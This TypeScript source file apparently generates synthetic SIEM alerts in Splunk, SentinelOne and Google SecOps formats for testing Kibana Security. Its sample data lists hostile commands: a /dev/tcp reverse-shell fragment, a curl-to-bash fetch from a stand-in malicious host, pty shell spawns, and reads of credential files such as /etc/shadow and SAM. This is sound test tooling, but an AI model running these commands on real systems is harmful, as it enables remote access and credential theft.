/**
 * AI4SOC Alert Generator
 * 
 * Generates platform-specific security alerts for AI4SOC product tier.
 * Supports Splunk, SentinelOne, and Google SecOps alert formats.
 */

import { faker } from '@faker-js/faker';
import { generateTimestamp, TimestampConfig } from '../utils/timestamp_utils';

export type AI4SOCPlatform = 'splunk' | 'sentinelone' | 'google-secops' | 'all';

export interface AI4SOCAlertOptions {
  platform: AI4SOCPlatform;
  userName?: string;
  hostName?: string;
  timestampConfig?: TimestampConfig;
  severity?: 'high' | 'critical' | 'medium';
  eventType?: 'file_access' | 'process_creation' | 'network_access';
  useRealisticData?: boolean;
}

export interface AI4SOCAlert {
  platform: string;
  alert: Record<string, any>;
  indexPattern: string;
}

/**
 * Core AI4SOC Alert Generator Service
 */
export class AI4SOCAlertGenerator {

  /**
   * Create base Kibana Security alert structure for AI4SOC
   */
  private createBaseKibanaAlert(timestamp: string, userName: string, hostName: string, severity: string, platform: string): Record<string, any> {
    const ruleId = faker.string.uuid();
    const alertId = faker.string.uuid();
    
    return {
      '@timestamp': timestamp,
      'kibana.alert.uuid': alertId,
      'kibana.alert.start': timestamp,
      'kibana.alert.last_detected': timestamp,
      'kibana.version': '8.15.0',
      'kibana.space_ids': ['default'],
      'kibana.alert.rule.uuid': ruleId,
      'kibana.alert.rule.rule_id': `ai4soc-${platform}-${faker.string.alphanumeric(8)}`,
      'kibana.alert.rule.name': `AI4SOC ${platform.charAt(0).toUpperCase() + platform.slice(1)} Security Alert`,
      'kibana.alert.rule.category': 'AI4SOC Alert Rule',
      'kibana.alert.rule.consumer': 'siem',
      'kibana.alert.rule.producer': 'siem',
      'kibana.alert.rule.rule_type_id': 'siem.queryRule',
      'kibana.alert.rule.parameters': {
        description: `AI4SOC ${platform} platform alert generation`,
        risk_score: severity === 'critical' ? 100 : severity === 'high' ? 75 : 50,
        severity: severity,
        query: `ai4soc.platform: "${platform}"`,
        related_integrations: [{
          package: platform === 'splunk' ? 'splunk' : 
                   platform === 'sentinelone' ? 'sentinel_one' : 
                   'gcp_security_command_center',  // Use proper Google Cloud package
          version: platform === 'splunk' ? '1.0.0' : 
                   platform === 'sentinelone' ? '1.3.0' : 
                   '1.0.0'
        }]
      },
      'kibana.alert.status': 'active',
      'kibana.alert.workflow_status': 'open',
      'kibana.alert.severity': severity,
      'kibana.alert.risk_score': severity === 'critical' ? 100 : severity === 'high' ? 75 : 50,
      'kibana.alert.reason': `AI4SOC ${platform} alert detected on ${hostName}`,
      'event.kind': 'signal',
      'user.name': userName,
      'host.name': hostName,
      'ai4soc': {
        platform: platform,
        version: '1.0.0',
        generator: 'security-documents-generator'
      },
      // Add integration field for Integration column display
      'relatedIntegration': platform === 'splunk' ? 'splunk' : 
                           platform === 'sentinelone' ? 'sentinel_one' : 
                           'gcp_security_command_center'
    };
  }

  /**
   * Generate AI4SOC platform-specific alerts
   */
  generateAlert(options: AI4SOCAlertOptions): AI4SOCAlert[] {
    const {
      platform,
      userName = this.generateUsername(),
      hostName = this.generateHostname(),
      timestampConfig,
      severity = 'high',
      eventType = 'file_access',
      useRealisticData = true
    } = options;

    const alerts: AI4SOCAlert[] = [];

    if (platform === 'all') {
      alerts.push(this.generateSplunkAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
      alerts.push(this.generateSentinelOneAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
      alerts.push(this.generateGoogleSecOpsAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
    } else {
      switch (platform) {
        case 'splunk':
          alerts.push(this.generateSplunkAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
          break;
        case 'sentinelone':
          alerts.push(this.generateSentinelOneAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
          break;
        case 'google-secops':
          alerts.push(this.generateGoogleSecOpsAlert({ userName, hostName, timestampConfig, severity, eventType, useRealisticData }));
          break;
      }
    }

    return alerts;
  }

  /**
   * Generate Splunk-formatted alert
   */
  private generateSplunkAlert(options: Omit<AI4SOCAlertOptions, 'platform'>): AI4SOCAlert {
    const { userName, hostName, timestampConfig, severity = 'high', eventType = 'file_access', useRealisticData } = options;
    const timestamp = generateTimestamp(timestampConfig);
    const eventId = faker.string.uuid();
    const severityScore = severity === 'critical' ? faker.number.int({ min: 85, max: 100 }) : 
                         severity === 'high' ? faker.number.int({ min: 70, max: 84 }) :
                         faker.number.int({ min: 50, max: 69 });

    let eventDetails: Record<string, any> = {};

    if (eventType === 'file_access') {
      const suspiciousFiles = [
        'C:\\Temp\\data.zip',
        'C:\\Users\\Public\\sensitive.txt',
        'C:\\Windows\\System32\\config\\system',
        '/tmp/credentials.txt',
        '/home/user/downloads/malware.exe'
      ];
      
      eventDetails = {
        file_path: useRealisticData ? faker.helpers.arrayElement(suspiciousFiles) : 'C:\\Temp\\data.zip',
        file_size: faker.number.int({ min: 1024, max: 10485760 }),
        file_hash: faker.string.hexadecimal({ length: 64 }),
        access_type: faker.helpers.arrayElement(['read', 'write', 'execute', 'delete']),
        process_name: faker.helpers.arrayElement(['cmd.exe', 'powershell.exe', 'python.exe', 'bash'])
      };
    } else if (eventType === 'process_creation') {
      const suspiciousProcesses = [
        'powershell.exe -enc',
        'cmd.exe /c whoami',
        'sudo su -',
        'bash -i >& /dev/tcp/',
        'python -c "import pty;pty.spawn(\'/bin/bash\')"'
      ];
      
      eventDetails = {
        process_command: useRealisticData ? faker.helpers.arrayElement(suspiciousProcesses) : 'cmd.exe /c whoami',
        parent_process: faker.helpers.arrayElement(['explorer.exe', 'svchost.exe', 'bash', 'ssh']),
        process_id: faker.number.int({ min: 1000, max: 99999 }),
        parent_process_id: faker.number.int({ min: 100, max: 999 })
      };
    }

    // Create base Kibana Security alert structure
    const baseKibanaAlert = this.createBaseKibanaAlert(timestamp, userName, hostName, severity, 'splunk');
    
    const splunkAlert = {
      ...baseKibanaAlert,  // Include all Kibana alert fields
      // Splunk-specific fields
      _time: timestamp,
      _raw: `${timestamp} ${hostName} Suspicious ${eventType.replace('_', ' ')} detected`,
      'splunk.source': 'ai4soc:security',  // Renamed to avoid conflict with ECS source field
      sourcetype: 'ai4soc:alert',
      index: 'ai4soc_security',
      'splunk.host': hostName,  // Renamed to avoid conflict with ECS host field
      splunk_server: faker.internet.domainName(),
      event: {
        id: eventId,
        title: `Suspicious ${eventType.replace('_', ' ')} Activity`,
        description: `High-risk ${eventType.replace('_', ' ')} activity detected on ${hostName}`,
        category: 'security',
        type: eventType,
        severity: severity,
        severity_score: severityScore,
        confidence: faker.number.int({ min: 80, max: 100 }),
        created_time: timestamp,
        updated_time: timestamp
      },
      user: {
        name: userName,
        domain: faker.internet.domainName(),
        sid: `S-1-5-21-${faker.number.int({ min: 1000000000, max: 9999999999 })}`
      },
      host_info: {
        name: hostName,
        os: faker.helpers.arrayElement(['Windows 10', 'Windows Server 2019', 'Ubuntu 20.04', 'CentOS 7']),
        ip: faker.internet.ip(),
        mac: faker.internet.mac()
      },
      network: {
        src_ip: faker.internet.ip(),
        dest_ip: faker.internet.ip(),
        src_port: faker.internet.port(),
        dest_port: faker.internet.port()
      },
      ...eventDetails,
      tags: ['ai4soc', 'security', 'suspicious_activity', eventType],
      risk_score: severityScore,
      mitre_technique: this.getMitreTechnique(eventType),
      ai4soc: {
        platform: 'splunk',
        version: '1.0',
        generated_by: 'security-documents-generator'
      }
    };

    return {
      platform: 'splunk',
      alert: splunkAlert,
      indexPattern: '.alerts-security.alerts-*'  // Use standard Kibana Security alert index
    };
  }

  /**
   * Generate SentinelOne-formatted alert
   */
  private generateSentinelOneAlert(options: Omit<AI4SOCAlertOptions, 'platform'>): AI4SOCAlert {
    const { userName, hostName, timestampConfig, severity = 'high', eventType = 'file_access', useRealisticData } = options;
    const timestamp = generateTimestamp(timestampConfig);
    const alertId = faker.string.uuid();
    const agentId = faker.string.uuid();

    let threatInfo: Record<string, any> = {};

    if (eventType === 'process_creation') {
      const suspiciousCommands = [
        'sudo su',
        'pkexec /bin/bash',
        'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
        'powershell.exe -ExecutionPolicy Bypass',
        'cmd.exe /c net user administrator'
      ];
      
      threatInfo = {
        processDisplayName: useRealisticData ? faker.helpers.arrayElement(suspiciousCommands) : 'sudo su',
        processName: faker.helpers.arrayElement(['sudo', 'pkexec', 'python3', 'powershell.exe', 'cmd.exe']),
        processIntegrityLevel: faker.helpers.arrayElement(['System', 'High', 'Medium', 'Low']),
        processImageSha1: faker.string.hexadecimal({ length: 40 }),
        processImagePath: faker.helpers.arrayElement(['/usr/bin/sudo', '/usr/bin/pkexec', 'C:\\Windows\\System32\\cmd.exe']),
        parentProcessName: faker.helpers.arrayElement(['bash', 'ssh', 'explorer.exe', 'svchost.exe']),
        commandline: useRealisticData ? faker.helpers.arrayElement(suspiciousCommands) : 'sudo su'
      };
    } else if (eventType === 'file_access') {
      const suspiciousFiles = [
        '/etc/shadow',
        '/home/user/.ssh/id_rsa',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Users\\Administrator\\Desktop\\secrets.txt'
      ];
      
      threatInfo = {
        filePath: useRealisticData ? faker.helpers.arrayElement(suspiciousFiles) : '/etc/shadow',
        fileDisplayName: faker.system.fileName(),
        fileSha1: faker.string.hexadecimal({ length: 40 }),
        processDisplayName: faker.helpers.arrayElement(['cat', 'type', 'more', 'python3']),
        processImagePath: faker.helpers.arrayElement(['/bin/cat', 'C:\\Windows\\System32\\cmd.exe'])
      };
    }

    // Create base Kibana Security alert structure
    const baseKibanaAlert = this.createBaseKibanaAlert(timestamp, userName, hostName, severity, 'sentinelone');
    
    const sentinelOneAlert = {
      ...baseKibanaAlert,  // Include all Kibana alert fields
      // SentinelOne-specific fields
      id: alertId,
      alertInfo: {
        alertId: alertId,
        analystVerdict: 'undefined',
        createdAt: timestamp,
        dvEventId: faker.string.uuid(),
        eventType: 'threats',
        hitType: 'threats',
        incidentStatus: 'unresolved',
        isEdr: true,
        reportedAt: timestamp,
        source: 'STAR',
        updatedAt: timestamp
      },
      ruleInfo: {
        name: `Suspicious ${eventType.replace('_', ' ')} Activity`,
        description: `Detected suspicious ${eventType.replace('_', ' ')} behavior indicating potential security threat`,
        severity: severity.toUpperCase(),
        ruleId: faker.string.uuid(),
        treatAsThreat: severity === 'critical' ? 'MALICIOUS' : 'SUSPICIOUS'
      },
      agentDetectionInfo: {
        agentDetectionState: 'available',
        agentId: agentId,
        agentIpV4: faker.internet.ip(),
        agentIpV6: faker.internet.ipv6(),
        agentLastLoggedInUserName: userName,
        agentMitigationMode: 'protect',
        agentOsName: faker.helpers.arrayElement(['linux', 'windows']),
        agentOsRevision: faker.system.semver(),
        agentRegisteredAt: faker.date.past().toISOString(),
        agentVersion: '22.3.0.0',
        externalIp: faker.internet.ip(),
        name: hostName,
        uuid: agentId
      },
      threatInfo: {
        classification: severity === 'critical' ? 'Malware' : 'PUA',
        classificationSource: 'Engine',
        cloudFilesHashVerdict: 'unknown',
        confidenceLevel: severity === 'critical' ? 'malicious' : 'suspicious',
        createdAt: timestamp,
        engines: ['reputation', 'pre_execution'],
        externalTicketExists: false,
        failedActions: false,
        fileVerificationType: 'NotSigned',
        identifiedAt: timestamp,
        initiatedBy: 'agent_policy',
        initiatedByDescription: 'Agent Policy',
        isFileless: false,
        isValidCertificate: false,
        mitigatedPreemptively: false,
        mitigationStatus: 'not_mitigated',
        pendingActions: false,
        reachedEventsLimit: false,
        rebootRequired: false,
        sha1: faker.string.hexadecimal({ length: 40 }),
        threatId: faker.string.uuid(),
        threatName: `AI4SOC.${eventType}.${severity}`,
        updatedAt: timestamp,
        ...threatInfo
      },
      containerInfo: {
        id: faker.string.uuid(),
        image: faker.helpers.arrayElement(['ubuntu:20.04', 'alpine:latest', 'nginx:latest']),
        labels: `ai4soc=${eventType}`,
        name: faker.lorem.slug()
      },
      kubernetesInfo: {
        cluster: faker.lorem.word(),
        namespace: 'ai4soc-security',
        node: hostName,
        pod: faker.lorem.slug()
      },
      mitre: this.getMitreTechnique(eventType),
      ai4soc: {
        platform: 'sentinelone',
        version: '1.0',
        generated_by: 'security-documents-generator'
      }
    };

    return {
      platform: 'sentinelone',
      alert: sentinelOneAlert,
      indexPattern: '.alerts-security.alerts-*'  // Use standard Kibana Security alert index
    };
  }

  /**
   * Generate Google SecOps-formatted alert
   */
  private generateGoogleSecOpsAlert(options: Omit<AI4SOCAlertOptions, 'platform'>): AI4SOCAlert {
    const { userName, hostName, timestampConfig, severity = 'high', eventType = 'file_access', useRealisticData } = options;
    const timestamp = generateTimestamp(timestampConfig);
    const alertId = faker.string.uuid();
    const severityScore = severity === 'critical' ? faker.number.int({ min: 85, max: 100 }) : 
                         severity === 'high' ? faker.number.int({ min: 70, max: 84 }) :
                         faker.number.int({ min: 50, max: 69 });

    let eventDetails: Record<string, any> = {};

    if (eventType === 'file_access') {
      const suspiciousFiles = [
        'C:\\Windows\\System32\\secret.txt',
        'C:\\ProgramData\\sensitive_data.db',
        '/etc/passwd',
        '/var/log/auth.log',
        '/home/user/confidential.xlsx'
      ];
      
      eventDetails = {
        src_file: {
          path: useRealisticData ? faker.helpers.arrayElement(suspiciousFiles) : 'C:\\Windows\\System32\\secret.txt',
          size: faker.number.int({ min: 1024, max: 10485760 }),
          hash: {
            sha256: faker.string.hexadecimal({ length: 64 }),
            md5: faker.string.hexadecimal({ length: 32 })
          },
          mime_type: faker.helpers.arrayElement(['text/plain', 'application/octet-stream', 'application/x-executable'])
        },
        process: {
          name: faker.helpers.arrayElement(['notepad.exe', 'cat', 'type', 'python.exe']),
          pid: faker.number.int({ min: 1000, max: 99999 }),
          command_line: faker.helpers.arrayElement([
            'notepad.exe C:\\Windows\\System32\\secret.txt',
            'cat /etc/passwd',
            'type C:\\Windows\\System32\\secret.txt'
          ])
        }
      };
    } else if (eventType === 'process_creation') {
      const suspiciousCommands = [
        'powershell.exe -enc IABpAGYAKAAkAFAAUwBWAGUAcgBzAGkA',
        'bash -c "curl -fsSL https://malicious.com/script.sh | bash"',
        'python3 -c "exec(\\\"\\\\x69\\\\x6d\\\\x70\\\\x6f\\\\x72\\\\x74\\\\x20\\\\x6f\\\\x73\\\")"'
      ];
      
      eventDetails = {
        process: {
          name: faker.helpers.arrayElement(['powershell.exe', 'bash', 'python3', 'cmd.exe']),
          pid: faker.number.int({ min: 1000, max: 99999 }),
          ppid: faker.number.int({ min: 100, max: 999 }),
          command_line: useRealisticData ? faker.helpers.arrayElement(suspiciousCommands) : 'powershell.exe -enc base64command',
          creation_time: timestamp,
          file: {
            path: faker.helpers.arrayElement([
              'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              '/bin/bash',
              '/usr/bin/python3'
            ]),
            hash: {
              sha256: faker.string.hexadecimal({ length: 64 })
            }
          }
        },
        parent_process: {
          name: faker.helpers.arrayElement(['explorer.exe', 'sshd', 'systemd']),
          pid: faker.number.int({ min: 100, max: 999 })
        }
      };
    }

    // Create base Kibana Security alert structure
    const baseKibanaAlert = this.createBaseKibanaAlert(timestamp, userName, hostName, severity, 'google-secops');
    
    const googleSecOpsAlert = {
      ...baseKibanaAlert,  // Include all Kibana alert fields
      // Google SecOps-specific fields
      alert: {
        alertId: alertId,
        title: `Suspicious ${eventType.replace('_', ' ')} Activity`,
        description: `High-severity ${eventType.replace('_', ' ')} event detected on ${hostName}`,
        category: 'SUSPICIOUS_ACTIVITY',
        severity: severity.toUpperCase(),
        priority: severity === 'critical' ? 'HIGH' : 'MEDIUM',
        status: 'NEW',
        createTime: timestamp,
        updateTime: timestamp,
        source: {
          product: 'AI4SOC Security Generator',
          vendor: 'Elastic Security',
          detector: `ai4soc_${eventType}_detector`
        },
        finding: {
          findingId: faker.string.uuid(),
          findingClass: eventType.toUpperCase(),
          severity: severity.toUpperCase(),
          confidence: faker.helpers.arrayElement(['HIGH', 'MEDIUM', 'LOW']),
          verdict: severity === 'critical' ? 'MALICIOUS' : 'SUSPICIOUS'
        }
      },
      entity: {
        hostname: hostName,
        asset: {
          hostname: hostName,
          ip: faker.internet.ip(),
          mac: faker.internet.mac(),
          assetId: faker.string.uuid(),
          platform: faker.helpers.arrayElement(['WINDOWS', 'LINUX', 'MACOS']),
          platformVersion: faker.system.semver()
        },
        user: {
          userid: userName,
          displayName: faker.person.fullName(),
          email: `${userName}@${faker.internet.domainName()}`,
          department: faker.helpers.arrayElement(['IT', 'Finance', 'HR', 'Operations'])
        }
      },
      network: {
        sourceIp: faker.internet.ip(),
        destinationIp: faker.internet.ip(),
        sourcePort: faker.internet.port(),
        destinationPort: faker.internet.port(),
        protocol: faker.helpers.arrayElement(['TCP', 'UDP', 'HTTP', 'HTTPS']),
        direction: faker.helpers.arrayElement(['INBOUND', 'OUTBOUND'])
      },
      securityMarks: {
        marks: {
          'ai4soc-generated': 'true',
          'event-type': eventType,
          'platform': 'google-secops',
          'severity': severity
        }
      },
      ...eventDetails,
      riskScore: severityScore,
      mitre: this.getMitreTechnique(eventType),
      timeline: {
        eventTime: timestamp,
        ingestionTime: new Date().toISOString(),
        processingTime: new Date().toISOString()
      },
      ai4soc: {
        platform: 'google-secops',
        version: '1.0',
        generated_by: 'security-documents-generator'
      }
    };

    return {
      platform: 'google-secops',
      alert: googleSecOpsAlert,
      indexPattern: '.alerts-security.alerts-*'  // Use standard Kibana Security alert index
    };
  }

  /**
   * Generate realistic username
   */
  private generateUsername(): string {
    return faker.helpers.arrayElement(['bob', 'alice', 'john.doe', 'admin', 'service_account', 'contractor']);
  }

  /**
   * Generate realistic hostname
   */
  private generateHostname(): string {
    const prefixes = ['ws', 'srv', 'db', 'web', 'mail', 'dc'];
    const environments = ['prod', 'dev', 'test'];
    const prefix = faker.helpers.arrayElement(prefixes);
    const env = faker.helpers.arrayElement(environments);
    const num = faker.number.int({ min: 1, max: 99 }).toString().padStart(2, '0');
    return `${prefix}-${env}-${num}`;
  }

  /**
   * Get MITRE ATT&CK technique based on event type
   */
  private getMitreTechnique(eventType: string): Record<string, any> {
    const techniques = {
      file_access: {
        technique_id: 'T1005',
        technique_name: 'Data from Local System',
        tactic: 'Collection',
        subtechnique: false
      },
      process_creation: {
        technique_id: 'T1059',
        technique_name: 'Command and Scripting Interpreter',
        tactic: 'Execution',
        subtechnique: {
          id: 'T1059.004',
          name: 'Unix Shell'
        }
      },
      network_access: {
        technique_id: 'T1071',
        technique_name: 'Application Layer Protocol',
        tactic: 'Command and Control',
        subtechnique: false
      }
    };

    return techniques[eventType as keyof typeof techniques] || techniques.file_access;
  }
}

// Export singleton instance
export const ai4socAlertGenerator = new AI4SOCAlertGenerator();